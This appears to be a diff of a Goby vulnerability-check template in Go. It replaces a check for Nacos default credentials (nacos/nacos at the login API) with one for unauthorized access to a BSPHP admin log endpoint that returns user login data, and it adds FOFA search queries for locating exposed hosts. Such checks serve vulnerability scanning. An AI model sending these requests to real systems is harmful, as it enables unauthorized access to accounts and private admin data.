@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "BSPHP存在未授权访问漏洞",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
-  "Level": "3",
+  "FofaQuery": "body=\"BSPHP\"",
+  "GobyQuery": "body=\"BSPHP\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,17 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "method": "GET",
+        "uri": "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0%E2%80%98",
         "follow_redirect": true,
-        "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
+        "header": {},
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +51,14 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "\"key\"",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "\"user\"",
             "bz": ""
           }
         ]
@@ -112,8 +114,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "BSPHP存在未授权访问漏洞",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +123,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "BSPHP Unauthorized",
       "Product": "",
       "Description": "",
       "Recommendation": "",
